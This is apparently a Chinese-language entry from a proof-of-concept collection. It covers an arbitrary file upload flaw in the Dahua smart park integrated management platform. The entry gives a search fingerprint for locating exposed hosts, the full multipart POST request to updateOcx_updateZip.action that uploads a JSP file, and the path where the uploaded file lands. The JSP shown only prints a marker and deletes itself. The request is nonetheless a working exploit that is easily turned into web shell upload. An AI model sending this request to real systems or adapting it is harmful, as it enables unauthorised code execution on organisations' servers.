# 大华智慧园区系统updateOcx_updateZip.action存在任意文件上传漏洞

- **系统**：大华　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /portal/updateOcx_updateZip.action HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 431`　`Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3`　`Content-Type: multipart/form-data; boundary=9aa1b50e33144fb18837cc97ed863d…`

**请求体 / payload**
```
--9aa1b50e33144fb18837cc97ed863df7
Content-Disposition: form-data; name="updateBean.compressFileName"
KgJrYe.jsp
--9aa1b50e33144fb18837cc97ed863df7
Content-Disposition: form-data; name="updateBean.compress"; filename="KgJrYe.jsp"
Content-Type: text/plain
<% out.println(32461+18843+"eiaDXmEZEvlnjVVz");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--9aa1b50e33144fb18837cc97ed863df7-
文件地址 20240801102132 文件上传时间戳
[http://xx.xx.xx.xx/portal/ocx/20240801102132/KgJrYe.jsp](http://xx.xx.xx.xx/portal/ocx/20240801102132/KgJrYe.jsp)
```
- **预期**：200　|　—